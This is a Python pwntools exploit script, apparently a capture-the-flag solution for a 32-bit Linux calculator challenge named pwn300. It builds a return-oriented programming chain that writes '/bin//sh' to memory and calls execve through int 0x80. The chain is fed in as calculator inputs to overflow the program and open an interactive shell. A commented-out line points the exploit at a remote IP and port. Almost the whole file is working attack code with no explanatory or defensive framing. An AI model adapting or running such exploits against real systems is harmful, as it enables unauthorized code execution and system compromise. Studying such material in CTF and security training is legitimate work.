#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import binascii
import ctypes as ct
from struct import pack

context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048ff5'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('/home/h11p/hackme/huxiangbei/pwn300')

io = process('/home/h11p/hackme/huxiangbei/pwn300')

#io = remote('104.224.169.128', 18887)


p=[]

p.append( 0x0806ed0a)  # pop edx ; ret
p.append( 0x080ea060)  # @ .data
p.append( 0x080bb406)  # pop eax ; ret
p.append(eval('0x'+binascii.b2a_hex('nib/')))
p.append( 0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append( 0x0806ed0a)  # pop edx ; ret
p.append( 0x080ea064)  # @ .data + 4
p.append( 0x080bb406)  # pop eax ; ret
p.append(eval('0x'+binascii.b2a_hex('hs//')))
p.append(0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append(0x0806ed0a)  # pop edx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x08054730)  # xor eax, eax ; ret
p.append(0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append(0x080481c9)  # pop ebx ; ret
p.append(0x080ea060)  # @ .data
p.append(0x0806ed31)  # pop ecx ; pop ebx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x080ea060)  # padding without overwrite ebx
p.append(0x0806ed0a)  # pop edx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x08054730)  # xor eax, eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x08049781)  # int 0x80

tempnum=0
#debug()
io.recvuntil('How many times do you want to calculate:')
io.sendline('255')
for i in xrange(0,16):
    io.recvuntil('5 Save the result\n')
    io.sendline('1')
    io.recvuntil('input the integer x:')
    io.sendline(str(tempnum))
    io.recvuntil('input the integer y:')
    io.sendline('0')

for j in p:
    io.recvuntil('5 Save the result\n')
    io.sendline('1')
    io.recvuntil('input the integer x:')
    io.sendline(str(ct.c_int32(j).value))
    io.recvuntil('input the integer y:')
    io.sendline('0')

io.recvuntil('5 Save the result\n')
io.sendline('5')
io.interactive()
io.close()

